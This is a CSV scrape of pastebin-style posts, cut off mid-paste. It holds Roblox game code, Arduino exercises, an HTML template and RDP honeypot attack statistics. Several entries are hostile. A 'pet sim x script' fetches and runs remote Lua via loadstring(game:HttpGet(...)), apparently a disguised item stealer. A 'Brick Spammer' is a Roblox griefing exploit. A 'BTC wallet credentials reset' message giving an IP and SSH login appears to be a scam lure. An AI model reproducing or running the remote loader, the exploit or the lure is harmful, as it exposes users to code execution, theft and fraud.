@@ -1,0 +1,3672 @@
+id,title,username,language,date,content
+W0FjzjAY,Ragdoll Codebase [incomplete],svenny,Lua,Sunday 14th of May 2023 09:25:13 PM CDT,"--[[
+	Ragdoll wars codebase.
+
+	Written by AljoSven.
+
+
+
+	Several scripts have been pasted here. They are each separated by a header with information about the script.
+--]]
+
+
+--// SERVER //--
+--[[ SCRIPT_HEADER | Main - Script]]
+
+local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
+local Network = ReplicatedStorage:WaitForChild(""Network"")
+local Library = ReplicatedStorage:WaitForChild(""Library"")
+
+local StateMachine = require(Library.StateMachine)
+
+function CreateRagdoll(character)
+	for _, motor in ipairs(character:GetDescendants()) do
+		if motor:IsA(""Motor6D"") and motor.Name ~= ""Neck"" then
+			local socket = Instance.new(""BallSocketConstraint"")
+			local attachment_name = motor.Name..""RigAttachment""
+
+			socket.Enabled = false
+			
+			socket.Name = motor.Name .. ""BallJoint""
+			socket.Attachment0 = motor.Part0[attachment_name]
+			socket.Attachment1 = motor.Part1[attachment_name]
+			socket.Parent = motor.Parent
+		end
+	end
+end
+
+function SetRagdoll(player, state)
+	local character = player.Character
+	
+	for _, constraint in ipairs(character:GetDescendants()) do
+		if not (constraint.Name == ""Neck"") then
+			if constraint:IsA(""Motor6D"") then
+				constraint.Enabled = not state
+			elseif constraint:IsA(""BallSocketConstraint"") then
+				constraint.Enabled = state
+			end
+		end
+	end
+end
+
+function CreateGunModel(id)
+	local model = ReplicatedStorage.Weapons:FindFirstChild(id)
+	if model then
+		model = model:Clone()
+		local muzzle_light = Instance.new(""PointLight"", model.Handle.BulletOrigin)
+		muzzle_light.Color = Color3.new(1, 0.8, 0)
+	end
+	return model
+end
+
+local PlayerState = {}
+
+local States = {
+	Activate = function(player)
+		local character = player.Character
+		character.Humanoid.RequiresNeck = false
+		character.Humanoid.BreakJointsOnDeath = false
+		CreateRagdoll(character)
+		
+		local weapon = CreateGunModel(""Deagle"")
+		if weapon then
+			weapon.Parent = character -- have to do this before weld
+
+			local weld = Instance.new(""Weld"", character.RightHand)
+			weld.Part0 = weld.Parent
+			weld.Part1 = weapon.PrimaryPart
+			weld.C0 = character.RightHand.RightGripAttachment.CFrame
+			weld.C1 = weapon.Handle.GripAttachment.CFrame
+		end
+		
+		print(""SERVER: firing character added"")
+		Network.CharacterAdded:FireAllClients(player)
+		
+		return ""Default""
+	end,
+	Respawn = function(player)
+		if player.Character then
+			player.Character:Destroy()
+		end
+		task.wait(1)
+		player:LoadCharacter()
+		player.Character:WaitForChild(""HumanoidRootPart"")
+		player.Character.Humanoid.Died:Connect(function()
+			PlayerState[player]:Transition(""Dead"")
+		end)
+		return ""Activate""
+	end,
+	Dead = function(player, prev_state)
+		if prev_state ~= ""Hit"" then
+			SetRagdoll(player, true)
+		end
+		task.wait(3)
+		return ""Respawn""
+	end,
+	Hit = function(player, prev_state, direction)
+		SetRagdoll(player, true)
+		Network.ApplyHit:FireClient(player, direction, 250)
+		
+		if player.Character then
+			local humanoid = player.Character:FindFirstChild(""Humanoid"")
+			if humanoid then
+				humanoid:TakeDamage(30)
+			end
+		end
+		
+		task.wait(3)
+		return ""Default""
+	end,
+	Default = function(player)
+		SetRagdoll(player, false)
+		Network.Resurrect:FireClient(player)
+	end,
+}
+
+function OnPlayerAdded(player)
+	PlayerState[player] = StateMachine.new(player)
+	
+	for state, transition in pairs(States) do
+		PlayerState[player]:DefineTransition(state, transition)
+	end
+	
+	PlayerState[player]:Transition(""Respawn"")
+	
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+	OnPlayerAdded(player)
+end
+
+game.Players.PlayerAdded:Connect(OnPlayerAdded)
+
+Network.RegisterHit.OnServerEvent:Connect(function(player, part, origin)
+	local victim = game.Players:GetPlayerFromCharacter(part.Parent)
+	if victim and not PlayerState[victim]:Is(""Hit"") then
+		print(""victim found, applying hit"")
+		local direction = (victim.Character.HumanoidRootPart.Position - origin).Unit
+		PlayerState[victim]:Transition(""Hit"", direction)
+	else
+		warn(""no victim found"")
+	end
+end)
+
+Network.ReplicateShot.OnServerEvent:Connect(function(player, origin)
+	
+end)
+
+workspace.Lava.Touched:Connect(function(hit)
+	print(""Touched"")
+	local player = game.Players:GetPlayerFromCharacter(hit.Parent)
+	if player and not PlayerState[player]:Is(""Dead"") then
+		PlayerState[player]:Transition(""Dead"")
+	end
+end)
+
+--[[
+while task.wait(10) do
+	for _, player in ipairs(game.Players:GetPlayers()) do
+		if PlayerState[player]:Is(""Default"") then
+			PlayerState[player]:Transition(""Hit"")
+		end
+	end
+end
+--]]
+
+
+--// CLIENT //--
+--[[ SCRIPT_HEADER | Input - ModuleScript]]
+local UserInputService = game:GetService(""UserInputService"")
+
+local InputHandler = {}
+
+local Player
+local Mouse 
+
+local KeyMapper = {}
+
+InputHandler.init = function(modules, library)
+	Player = game.Players.LocalPlayer
+	Mouse = Player:GetMouse()
+	
+	UserInputService.InputBegan:Connect(function(input, gpe)
+		local map = KeyMapper[input.KeyCode] or KeyMapper[input.UserInputType]
+		if map then
+			for event, callback in pairs(map) do
+				callback()
+			end
+		end
+	end)
+end
+
+InputHandler.GetTargetLocation = function()
+	return Mouse.Hit.p
+end
+
+InputHandler.GetTargetObject = function()
+	return Mouse.Target
+end
+
+InputHandler.OnEvent = function(name, keycode, fn)
+	if not KeyMapper[keycode] then
+		KeyMapper[keycode] = {}
+	end
+	
+	if KeyMapper[keycode][name] then
+		warn(""Event"", name, ""already exists! Overwriting"")
+	end
+	
+	KeyMapper[keycode][name] = fn
+end
+
+return InputHandler
+
+--[[ SCRIPT_HEADER | Ragdoll - ModuleScript]]
+local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
+local Network = ReplicatedStorage:WaitForChild(""Network"")
+
+local RagdollHandler = {}
+
+RagdollHandler.init = function(modules, library)
+	local character = modules.Character.Get()
+	
+	local Resurrect = Network:WaitForChild(""Resurrect"")
+	local ApplyHit = Network:WaitForChild(""ApplyHit"")
+	
+	ApplyHit.OnClientEvent:Connect(function(direction, force)
+		--character.HumanoidRootPart:ApplyImpulse(direction * force)
+		character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+		character.HumanoidRootPart:ApplyImpulse(direction * force)
+	end)
+
+	Resurrect.OnClientEvent:Connect(function()
+		character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+	end)
+end
+
+return RagdollHandler
+
+
+--[[ SCRIPT_HEADER | WeaponHandler - ModuleScript]]
+local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
+local Network = ReplicatedStorage:WaitForChild(""Network"")
+local Debris = game:GetService(""Debris"")
+
+local WhitelistTracker = require(script:WaitForChild(""WhitelistTracker""))
+
+local Player
+local Character
+local WeaponsFolder
+local Input
+
+local WeaponUI = require(script.WeaponUI)
+
+local WeaponHandler = {}
+
+WeaponHandler.init = function(modules, library)
+	WhitelistTracker.init(modules, library)
+	
+	Character = modules.Character.Get()
+	
+	Input = modules.Input
+	
+	WeaponsFolder = ReplicatedStorage:WaitForChild(""Weapons"")
+	
+	WeaponHandler.RaycastParams = RaycastParams.new()
+	WeaponHandler.RaycastParams.FilterType = Enum.RaycastFilterType.Whitelist
+	
+	WeaponHandler.WeaponModel = nil
+	WeaponHandler.OriginAttachment = nil
+	WeaponHandler.Equipped = library.State(false)
+	
+	WeaponHandler.AmmoState = library.State(0)
+	WeaponHandler.MagSize = 0
+	WeaponHandler.ReloadTime = 0
+	WeaponHandler.Reloading = library.State(false)
+	WeaponHandler.MuzzleLight = nil
+	
+	-- load animations
+	WeaponHandler.Animations = script.Animations
+	WeaponHandler.Tracks = {
+		Wield = Character.Humanoid:LoadAnimation(WeaponHandler.Animations.GunWield)
+	}
+	
+	WeaponHandler.Equipped:bind(function(state)
+		if state then
+			WeaponHandler.Tracks.Wield:Play()
+		else
+			WeaponHandler.Tracks.Wield:Stop()
+		end
+	end)
+	
+	-- create the ui
+	WeaponUI.init(modules, library)
+	
+	Input.OnEvent(""fire"", Enum.UserInputType.MouseButton1, WeaponHandler.Fire)
+	
+	WhitelistTracker.List:bind(function(list)
+		--print(""WeaponHandler: Whitelist updated to"", list)
+		WeaponHandler.RaycastParams.FilterDescendantsInstances = list
+		
+		--print(""FilterList:"", WeaponHandler.RaycastParams.FilterDescendantsInstances)
+		for i,v in ipairs(WeaponHandler.RaycastParams.FilterDescendantsInstances) do
+			print(v.Parent, v.Parent.Parent)
+		end
+		
+	end)
+	
+	
+	--NOTE: remove later
+	WeaponHandler.EquipWeapon(""Deagle"")
+end
+
+WeaponHandler.EquipWeapon = function(weapon_id)
+	WeaponHandler.WeaponModel = Character:WaitForChild(weapon_id, 3)
+	if not WeaponHandler.WeaponModel then 
+		return warn(""No weapon to equip!"")
+	end
+	
+	WeaponHandler.OriginAttachment = WeaponHandler.WeaponModel.Handle.BulletOrigin
+	WeaponHandler.MuzzleLight = WeaponHandler.OriginAttachment:FindFirstChild(""PointLight"")
+	
+	--NOTE: remember to replace this with proper gun stats
+	WeaponHandler.MagSize = 7
+	WeaponHandler.AmmoState:set(WeaponHandler.MagSize)
+	WeaponHandler.ReloadTime = 1
+	
+	WeaponHandler.Equipped:set(true)
+end
+
+WeaponHandler.CreateBeam = function(origin, target)
+	local part = Instance.new(""Part"")
+	part.Color = Color3.new(1, 0.827451, 0.313725)
+	part.Material = Enum.Material.Neon
+	part.Anchored = true
+	part.CanCollide = false
+	part.CanTouch = false
+	part.CanQuery = false
+	
+	local vector = target - origin
+	
+	part.Size = Vector3.new(0.05, 0.05, vector.Magnitude)
+	part.CFrame = CFrame.lookAt(origin + vector/2, target)
+	part.Parent = workspace
+	
+	game:GetService(""Debris""):AddItem(part, 0.05)
+end
+
+WeaponHandler.MuzzleFlash = function()
+	if WeaponHandler.MuzzleLight then
+		WeaponHandler.MuzzleLight.Enabled = true
+		task.delay(0.1, function()
+			WeaponHandler.MuzzleLight.Enabled = false
+		end)
+	end
+end
+
+WeaponHandler.ShowSparks = function(position)
+	local spark_part = ReplicatedStorage.Spark:Clone()
+	spark_part.Position = position
+	spark_part.Parent = workspace
+	spark_part.SparkAttachment.ParticleEmitter:Emit(math.random(5,10))
+	Debris:AddItem(spark_part, 2)
+end
+
+WeaponHandler.Fire = function()
+	--print(""attempting fire..."")
+	
+	-- guard clause
+	if not WeaponHandler.Equipped:get() 
+		or WeaponHandler.Reloading:get() 
+		or WeaponHandler.AmmoState:get() < 1 then
+		return print(""failed check"")
+	end
+	
+	-- get target location
+	local target_obj = Input.GetTargetObject()
+	local target_pos = Input.GetTargetLocation()
+	
+	local origin = WeaponHandler.OriginAttachment.WorldPosition
+	local direction = (target_pos - origin).Unit
+	
+	local result = workspace:Raycast(origin, direction*500, WeaponHandler.RaycastParams)
+	if result and result.Instance then
+		print(""CLIENT: Hit"", result.Instance)
+		Network.RegisterHit:FireServer(result.Instance, origin)
+	end
+	
+	-- create a beam to target_pos
+	WeaponHandler.CreateBeam(origin, target_pos)
+	WeaponHandler.MuzzleFlash()
+	WeaponHandler.ShowSparks(target_pos)
+	
+	WeaponHandler.AmmoState:update(function(val)
+		if val == 1 then -- fired last bullet
+			--print(""Reloading"")
+			WeaponHandler.Reloading:set(true)
+			task.delay(WeaponHandler.ReloadTime, function()
+				WeaponHandler.Reloading:set(false)
+				WeaponHandler.AmmoState:set(WeaponHandler.MagSize)
+			end)
+		end
+		return val - 1
+	end)
+	
+	--print(""successful fire"")
+end
+
+
+return WeaponHandler
+
+--[[ SCRIPT_HEADER | WeaponHandler::WhitelistTracker - ModuleScript]]
+local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
+local Network = ReplicatedStorage:WaitForChild(""Network"")
+
+local LocalPlayer
+
+local WhitelistTracker = {}
+
+local PartList = {
+	""Head"",
+	""HumanoidRootPart"",
+	""LeftUpperArm"",
+	""LeftLowerArm"",
+	""RightUpperArm"",
+	""RightLowerArm"",
+	""LeftUpperLeg"",
+	""LeftLowerLeg"",
+	""RightUpperLeg"",
+	""RightLowerLeg""
+}
+
+WhitelistTracker.init = function(module, library)
+	LocalPlayer = game.Players.LocalPlayer
+	
+	WhitelistTracker.List = library.State({})
+	WhitelistTracker.StackPointers = {}
+	
+	for _, player in ipairs(game.Players:GetPlayers()) do
+		WhitelistTracker.PlayerAdded(player)
+	end
+	
+	game.Players.PlayerAdded:Connect(WhitelistTracker.PlayerAdded)
+	
+	Network.CharacterAdded.OnClientEvent:Connect(function(player)
+		--print(""Network Server -> CharacterAdded"")
+		WhitelistTracker.CharacterAdded(player, player.Character)
+		print({[player.Character] = true})
+	end)
+end
+
+WhitelistTracker.PlayerAdded = function(player)
+	if player == LocalPlayer then return end
+	WhitelistTracker.CharacterAdded(player, player.Character)
+end
+
+WhitelistTracker.CharacterAdded = function(player, character)
+	if not character or player == LocalPlayer then return end
+	--print(""adding character for"", player)
+	WhitelistTracker.ClearParts(WhitelistTracker.StackPointers[player])
+	WhitelistTracker.List:update(function(list)
+		WhitelistTracker.StackPointers[player] = #list + 1
+		for _, part in ipairs(PartList) do
+			table.insert(list, character[part])
+		end
+		return list
+	end, true)
+	
+	--print(""CLIENT: Updated WhitelistTracker"")
+	--print(""WhitelistTracker:"", WhitelistTracker.List:get())
+	--print(""StackPointers:"", WhitelistTracker.StackPointers)
+end
+
+WhitelistTracker.ClearParts = function(pointer)
+	if not pointer then return end
+	local old_list = WhitelistTracker.List:get()
+	local new_list = {}
+	local index = 0
+	for i = 1, pointer - 1 do
+		new_list[i] = old_list[i]
+		index = i
+	end
+	for i = pointer + #PartList, #old_list do
+		index += 1
+		new_list[index] = old_list[i]
+	end
+	table.clear(old_list)
+	WhitelistTracker.List._value = new_list
+	
+	for player, value in pairs(WhitelistTracker.StackPointers) do
+		if value > pointer then
+			WhitelistTracker.StackPointers[player] = value - #PartList
+		end
+	end
+end
+
+return WhitelistTracker"
+BYNYXe5a,Untitled,artemsemkin,JavaScript,Sunday 14th of May 2023 09:01:10 PM CDT,"// Add AJAX frontend compatibility to DND Upload plugin
+if (!window.theme.isFirstLoad && typeof window.initDragDrop === 'function') {
+  window.initDragDrop();
+}
+"
+1WM8FpsL,Brick Spammer,VincentYee,Lua,Sunday 14th of May 2023 08:36:38 PM CDT,"--Name		@BrickSpammer6000
+--Author	@NaN
+--Created	@May 14th 2023 (9:36:36 PM)
+-------------------------------------------------------------------
+local game = game
+local workspace = workspace
+local NaN
+
+local waittick, a, b, c, d, e, f, g
+-------------------------------------------------------------------
+--https://www.roblox.com/games/12109643/Fencing
+game:GetService('RunService').Stepped:connect(function()
+	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+		if v.Name == ""Spray"" then
+			if v.Handle.Mesh then
+				v.Handle.Mesh:Destroy()
+			end
+			v.Parent = workspace
+		end
+	end
+end)
+
+local function paint()
+	for i,v in pairs(game.Workspace:GetChildren())do
+		if v.Name == ""Handle"" then
+			v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+			v.Transparency = 1
+			v.CanCollide = false
+			wait()
+			v.CFrame = game.Players.LocalPlayer.Character[""Left Leg""].CFrame
+		end
+	end
+end
+
+local function equip()
+	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren())do
+		if v.Name == ""Spray"" then
+			game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
+		end
+	end
+end
+
+--while wait(0.05) do
+while wait(NaN) do
+	paint()
+	equip()
+end"
+UgDGpANj,BTC Wallet Credentials have been reset,penandabbl_47,GetText,Sunday 14th of May 2023 08:33:03 PM CDT,"Dear User
+We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
+Your new login credentials will be 
+preciousannehn:H7QHSp on 16.16.200.36(SSH)
+Regards"
+BGiRknA5,Puzzlum.net templates sample code,jargon,HTML,Sunday 14th of May 2023 08:15:09 PM CDT,"<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""Defaults__Project"">Project</div> </td><td style=""vertical-align: middle; text-align: left;""> {{ a_project }} </td></tr>
+	
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""Defaults__version"">Version</div> </td><td style=""vertical-align: middle; text-align: left;""> v0.00 </td></tr>
+	
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""{{ a2_ts }}"">Timestamp</div> </td><td style=""vertical-align: middle; text-align: left;""> {{ a_ts }} </td></tr>
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""{{ a2_ext }}"">Extension</div> </td><td style=""vertical-align: middle; text-align: left;""> {{ a_ext }} </td></tr>
+
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""{{ a2_score }}"">Grade</div> </td><td style=""vertical-align: middle; text-align: left;""> {{ a_score }} </td></tr>			
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""{{ a2_comment }}"">Comment</div> </td><td style=""vertical-align: middle; text-align: left;""> {{ a_comment }} </td></tr>
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""Defaults__task"">Task</div> </td><td style=""vertical-align: middle; text-align: left;"">  </td></tr>
+
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""{{ a2_filesize }}"">File Size</div> </td><td style=""vertical-align: middle; text-align: left;""> {{ a_filesize }} </td></tr>
+	<tr><td style=""vertical-align: middle; text-align: center;""> <div class=""meta"" id=""{{ a2_hash }}"">{{ a_hashtype }}</div> </td><td style=""vertical-align: middle; text-align: left;""> {{ a_hash }} </td></tr>"
+UYKMvDYA,2023-05-14_stats.json,rdp_snitch,JSON,Sunday 14th of May 2023 07:15:08 PM CDT,"{
+  ""ip"": {
+    ""14.225.217.147"": 6,
+    ""162.241.158.17"": 25,
+    ""194.165.16.11"": 2,
+    ""193.227.49.10"": 1,
+    ""103.67.163.4"": 9,
+    ""103.151.53.95"": 1,
+    ""47.101.207.207"": 3,
+    ""45.135.201.65"": 3,
+    ""87.251.75.145"": 4,
+    ""52.152.162.146"": 1,
+    ""185.170.144.3"": 2,
+    ""31.43.185.32"": 5,
+    ""128.199.20.70"": 48,
+    ""221.121.151.132"": 1,
+    ""194.165.16.72"": 2,
+    ""87.251.64.110"": 2,
+    ""52.191.60.37"": 8,
+    ""207.244.113.183"": 1,
+    ""5.62.34.41"": 1,
+    ""202.144.192.176"": 12,
+    ""194.26.135.80"": 2,
+    ""207.244.80.16"": 1,
+    ""23.105.169.133"": 1,
+    ""23.111.255.168"": 1,
+    ""164.92.120.34"": 13,
+    ""46.4.104.75"": 12,
+    ""87.251.75.120"": 2,
+    ""170.64.128.147"": 30,
+    ""121.4.147.80"": 3,
+    ""185.11.61.199"": 4,
+    ""176.113.115.140"": 12,
+    ""20.169.241.254"": 6,
+    ""51.75.160.42"": 2,
+    ""43.156.9.187"": 8,
+    ""45.227.254.8"": 2,
+    ""162.210.195.162"": 1,
+    ""185.190.24.101"": 1,
+    ""207.244.72.48"": 2,
+    ""198.7.56.159"": 1,
+    ""27.72.25.113"": 4,
+    ""194.26.135.170"": 1,
+    ""207.244.110.12"": 1,
+    ""198.235.24.9"": 3,
+    ""87.251.75.64"": 1,
+    ""207.244.126.195"": 1,
+    ""167.94.138.33"": 1,
+    ""207.244.98.95"": 1,
+    ""106.116.169.71"": 1,
+    ""207.244.92.202"": 1,
+    ""62.233.50.165"": 1,
+    ""58.186.122.20"": 1,
+    ""167.94.138.51"": 1,
+    ""179.43.152.50"": 1,
+    ""190.147.170.65"": 1,
+    ""45.227.254.48"": 2,
+    ""167.172.105.35"": 22,
+    ""173.239.218.109"": 1,
+    ""198.235.24.45"": 3
+  },
+  ""asn"": {
+    ""AS135905"": 6,
+    ""AS19871"": 25,
+    ""AS48721"": 4,
+    ""AS2561"": 1,
+    ""AS150813"": 9,
+    ""AS135918"": 1,
+    ""AS37963"": 3,
+    ""AS44486"": 3,
+    ""AS208091"": 7,
+    ""AS8075"": 15,
+    ""AS48080"": 4,
+    ""AS211736"": 5,
+    ""AS14061"": 113,
+    ""AS45671"": 1,
+    ""AS30633"": 12,
+    ""AS36351"": 1,
+    ""AS63916"": 12,
+    ""AS57523"": 8,
+    ""AS24940"": 12,
+    ""AS45090"": 3,
+    ""AS57678"": 12,
+    ""AS16276"": 2,
+    ""AS132203"": 8,
+    ""AS267784"": 4,
+    ""AS211632"": 1,
+    ""AS7552"": 4,
+    ""AS396982"": 6,
+    ""AS398324"": 2,
+    ""AS4134"": 1,
+    ""AS18403"": 1,
+    ""AS51852"": 1,
+    ""AS10620"": 1,
+    ""AS62240"": 1
+  },
+  ""isp"": {
+    ""Vietnam Posts and Telecommunications Group"": 6,
+    ""Unified Layer"": 25,
+    ""Flyservers S.A."": 8,
+    ""Egyptian Universities Network"": 1,
+    ""Thoi MMO Company Limited"": 9,
+    ""Viet Digital Technology Liability Company"": 1,
+    ""Addresses CNNIC"": 3,
+    ""LIVINGBOTS"": 3,
+    ""XHOST-INTERNET-SOLUTIONS"": 7,
+    ""Microsoft Corporation"": 15,
+    ""Dmitriy Panchenko"": 4,
+    ""FOP Dmytro Nedilskyi"": 5,
+    ""DigitalOcean, LLC"": 113,
+    ""Servers Australia Pty. Ltd"": 1,
+    ""Leaseweb USA, Inc."": 10,
+    ""SoftLayer Technologies Inc."": 1,
+    ""IPTELECOM ASIA - Japan Tokyo"": 12,
+    ""Chang Way Technologies Co. Limited"": 8,
+    ""Leaseweb USA"": 2,
+    ""Hetzner Online GmbH"": 12,
+    ""China Internet Network Information Center"": 3,
+    ""Cat Technologies Co. Limited"": 12,
+    ""OVH SAS"": 2,
+    ""Shenzhen Tencent Computer Systems Company Limited"": 8,
+    ""Internet Solutions & Innovations LTD."": 1,
+    ""Newass2011xDSLHN"": 4,
+    ""Google LLC"": 6,
+    ""Censys, Inc."": 2,
+    ""Chinanet"": 1,
+    ""FPT Telecom Company"": 1,
+    ""Private Layer INC"": 1,
+    ""Telmex Colombia S.A."": 1,
+    ""LogicWeb Inc."": 1
+  },
+  ""org"": {
+    ""VNPT"": 6,
+    ""WEBSITEWELCOME.COM"": 25,
+    ""Flyservers S.A"": 4,
+    ""Egyptian Universities Network"": 1,
+    ""MINHTHOIPC"": 9,
+    ""FLYCLOUD Company Limited"": 1,
+    ""Aliyun Computing Co., LTD"": 3,
+    ""Unknown"": 19,
+    ""Xhost Internet Solutions"": 9,
+    ""Microsoft Azure Cloud (eastus)"": 15,
+    ""Xhostis"": 2,
+    ""FOP Dmytro Nedilskyi"": 5,
+    ""DigitalOcean, LLC"": 113,
+    ""Servers Australia Pty Ltd Wholesale Services"": 1,
+    ""Leaseweb USA, Inc."": 10,
+    ""AVAST Software"": 1,
+    ""Chang Way Technologies Co. Limited"": 3,
+    ""Tacticom, Inc."": 1,
+    ""Leaseweb USA, Inc"": 1,
+    ""Hetzner"": 12,
+    ""Tencent cloud computing (Beijing) Co., Ltd."": 3,
+    ""Starcrecium Limited"": 4,
+    ""Cat Technologies Co. Limited"": 12,
+    ""OVH Ltd"": 2,
+    ""Tencent Cloud Computing"": 8,
+    ""UAB Host Baltic"": 4,
+    ""Tribeka Web Advisors S.A"": 1,
+    ""Palo Alto Networks, Inc"": 6,
+    ""Censys, Inc"": 2,
+    ""Chinanet HE"": 1,
+    ""Sierra LLC"": 1,
+    ""FPTDYNAMICIP"": 1,
+    ""Private Layer Inc"": 1,
+    ""Telmex Colombia S.A."": 1,
+    ""NSQ-VENTURE"": 1
+  },
+  ""regionName"": {
+    ""Hanoi"": 6,
+    ""Utah"": 25,
+    ""Kaunas"": 4,
+    ""Giza"": 1,
+    ""Tinh Binh GJinh"": 9,
+    ""Da Nang"": 1,
+    ""Shanghai"": 6,
+    ""Bremen"": 3,
+    ""England"": 9,
+    ""Virginia"": 23,
+    ""North Holland"": 2,
+    ""Kyiv City"": 5,
+    ""Karnataka"": 48,
+    ""New South Wales"": 31,
+    ""Moscow"": 18,
+    ""Beijing"": 1,
+    ""Tokyo"": 12,
+    ""District of Columbia"": 3,
+    ""Georgia"": 1,
+    ""California"": 20,
+    ""Saxony"": 12,
+    ""Chechnya"": 4,
+    ""North West"": 8,
+    ""Vilnius"": 4,
+    ""Mariehamns stad"": 1,
+    ""Ho Chi Minh"": 4,
+    ""Michigan"": 2,
+    ""Hebei"": 1,
+    ""Haiphong"": 1,
+    ""Zurich"": 1,
+    ""Antioquia"": 1,
+    ""Hesse"": 22
+  },
+  ""country"": {
+    ""Vietnam"": 21,
+    ""United States"": 74,
+    ""Lithuania"": 8,
+    ""Egypt"": 1,
+    ""China"": 8,
+    ""Germany"": 37,
+    ""United Kingdom"": 9,
+    ""Netherlands"": 2,
+    ""Ukraine"": 5,
+    ""India"": 48,
+    ""Australia"": 31,
+    ""Russia"": 22,
+    ""Japan"": 12,
+    ""Singapore"": 8,
+    ""Aland Islands"": 1,
+    ""Switzerland"": 1,
+    ""Colombia"": 1
+  },
+  ""account"": {
+    ""hello"": 229,
+    ""Test"": 10,
+    ""Administr"": 18,
+    ""Almaz"": 2,
+    ""Domain"": 20,
+    ""PTBtsdrCD"": 1,
+    ""NOfmSD"": 1,
+    ""panRyx"": 1,
+    ""(empty)"": 4,
+    ""KcTDCjWGQ"": 1,
+    ""MczfjB"": 1,
+    ""xkQoXB"": 1
+  },
+  ""keyboard"": {
+    ""Unknown"": 289
+  },
+  ""client_build"": {
+    ""Unknown"": 289
+  },
+  ""client_name"": {
+    ""Unknown"": 289
+  },
+  ""ip_type"": {
+    ""mobile"": 6,
+    ""hosting"": 176,
+    ""Unknown"": 67,
+    ""hosting & proxy"": 36,
+    ""proxy"": 4
+  }
+}"
+YiHb39TW,pet sim x script,IonSmecherul,C++,Sunday 14th of May 2023 06:45:00 PM CDT,"UserName = ""onenameady""
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = ""Rizz Scriptz""
+_G.FirstText = ""Script Preparing""
+_G.SecondText = ""Script Loading...""
+_G.ThirdText = ""Almost Done...""
+_G.WaitingTime = 15 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet(""https://raw.githubusercontent.com/k4ftt/R/main/Main.lua"", true))()"
+0iQF33PP,[НРС] Вежбе 17 - Задатак 2,MartinSRB,C++,Sunday 14th of May 2023 05:37:22 PM CDT,"#include<arduinoPlatform.h>
+#include<tasks.h>
+#include<interrupts.h>
+#include<stdio.h>
+#include<serial.h>
+#include <pwm.h>
+#include<data.h>
+
+extern serial Serial;
+
+#define POTENCIOMETAR A0
+#define BTN           4
+#define SW            2
+
+typedef void interruptFunction();
+
+int br = 0,
+    btn_start_time,
+    btn_old_state,
+    btn_check_id,
+    sw_old_state;
+
+interruptFunction* sw_rising_func  = NULL,
+                 * sw_falling_func = NULL;
+
+void btn_check(int id, void* ptrt){
+    if(btn_old_state < digitalRead(BTN)){
+        btn_start_time = millis();
+        btn_old_state = digitalRead(BTN);
+    }else if(btn_old_state > digitalRead(BTN)){
+        if(millis() - btn_start_time >= 2000){
+            br += analogRead(POTENCIOMETAR);
+            Serial.print(""Vrednost br je: "");
+            Serial.println(br);
+        }
+        btn_old_state = digitalRead(BTN);
+    }
+}
+
+void turn_all_LED_off(){
+    for(int i = 26; i <= 33; ++i){
+        digitalWrite(i, LOW);
+    }
+}
+
+void sw_attach_interrupt(short mode, interruptFunction func){
+    if(mode == RISING){
+        sw_rising_func = func;
+    }else if(mode == FALLING){
+        sw_falling_func = func;
+    }
+}
+
+void sw_rising(){
+    turn_all_LED_off();
+    int dec = map(analogRead(POTENCIOMETAR), 0, 1023, 0, 255);
+    //Serial.println(dec); -> SAMO ZA TESTIRANJE <-
+    int i = 26;
+    while(dec / 2 != 0 || i <= 33){
+        digitalWrite(i++, dec % 2);
+        dec /= 2;
+    }
+}
+
+void sw_check(int id, void* ptrt){
+    if(sw_old_state < digitalRead(SW)){
+        sw_rising_func();
+        sw_old_state = digitalRead(SW);
+    }else if(sw_old_state > digitalRead(SW)){
+        sw_old_state = digitalRead(SW);
+    }
+}
+
+void serial_check(int id, void* ptrt){
+    if(Serial.available()){
+        int broj = atoi(Serial.readString());
+        if(broj < br){
+            setTaskState(btn_check_id, TASK_DISABLE);
+            Serial.println(""Broj koji je unet je manji od br. (onemogucavam task za btn 4)"");
+        }
+    }
+}
+
+void setup()
+{
+    Serial.begin(9600);
+    for(int i = 26; i <= 33; ++i){
+        pinMode(i, OUTPUT);
+    }
+    btn_old_state = digitalRead(BTN);
+    sw_old_state  = digitalRead(SW);
+    sw_attach_interrupt(RISING, sw_rising);
+    btn_check_id = createTask(btn_check, 50, TASK_ENABLE, NULL);
+    createTask(sw_check, 50, TASK_ENABLE, NULL);
+    createTask(serial_check, 500, TASK_ENABLE, NULL);
+}
+
+void loop()
+{
+
+}
+"
+rQFGxzT9,[НРС] Вежбе 17 - Задатак 1,MartinSRB,C++,Sunday 14th of May 2023 05:35:14 PM CDT,"// -------- ПОГЛЕДАЈ КОМЕНТАР --------- //
+#include<arduinoPlatform.h>
+#include<tasks.h>
+#include<interrupts.h>
+#include<stdio.h>
+#include<serial.h>
+#include <pwm.h>
+#include<data.h>
+
+extern serial Serial;
+
+#define LED 26
+#define BTN 4
+#define SW  2
+
+#define RISING  0
+#define FALLING 1
+
+typedef void interruptFunction();
+
+int br                 = 1,
+    blink_LED_task_id,
+    BTN_old_state,
+    SW_old_state;
+
+interruptFunction* sw_falling_edge_func,
+                 * sw_rising_edge_func;
+
+void blink_LED_task(int id, void* ptrt){
+    digitalWrite(LED, !digitalRead(LED));
+}
+
+void BTN_check(int id, void* ptrt){
+    if(BTN_old_state < digitalRead(BTN)){
